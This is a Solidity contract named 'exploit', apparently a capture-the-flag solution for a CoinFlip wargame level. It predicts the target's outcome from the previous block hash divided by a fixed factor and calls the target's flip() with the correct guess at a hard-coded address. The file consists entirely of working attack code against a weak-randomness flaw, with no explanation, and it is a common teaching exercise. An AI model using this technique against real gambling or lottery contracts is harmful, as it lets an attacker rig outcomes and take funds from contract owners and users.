pragma solidity ^0.8.0;

interface CoinFlip {
  function consecutiveWins() external returns (uint256);

  function flip(bool _guess) external returns (bool);
}

contract exploit {
  uint256 lastHash;
  uint256 hash;
  uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address coinFlip = 0x8bD3CC63ceE41125872dc57AAd88C2d31425eC7f;

  constructor() {}

  function getValue() public returns (uint256) {
    uint256 value = uint256(blockhash(block.number - 1));

    uint256 flip = value / FACTOR;
    bool side = flip == 1 ? true : false;

    if (side == true) {
      CoinFlip(coinFlip).flip(true);
    } else {
      CoinFlip(coinFlip).flip(false);
    }
  }
}
